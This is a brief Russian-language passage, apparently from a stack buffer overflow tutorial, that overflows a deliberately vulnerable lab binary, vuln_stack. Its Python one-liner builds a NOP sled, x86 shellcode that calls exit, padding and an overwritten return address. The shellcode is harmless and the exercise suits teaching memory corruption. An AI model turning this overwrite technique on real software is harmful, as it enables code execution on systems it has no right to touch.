
Собственно здесь нужно просто сделать системный вызов exit(_)

Я немного поменял vuln_stack, чтобы убедиться, что мы не возвращаемся обратно в main.

```bash
python3 -c "
import sys, struct

buf_addr=0xffffbe5c
sc = b'\x31\xc0\xb0\x01\x31\xdb\xcd\x80'
ret_addr = buf_addr + 40
print(f'ret_addr @ {hex(ret_addr)}', file=sys.stderr)

payload = b'\x90'*80 + sc + b'A'*(112 - 80 - len(sc)) + struct.pack('<I', ret_addr)
sys.stdout.buffer.write(payload)
" | xargs -0 ./vuln_stack
```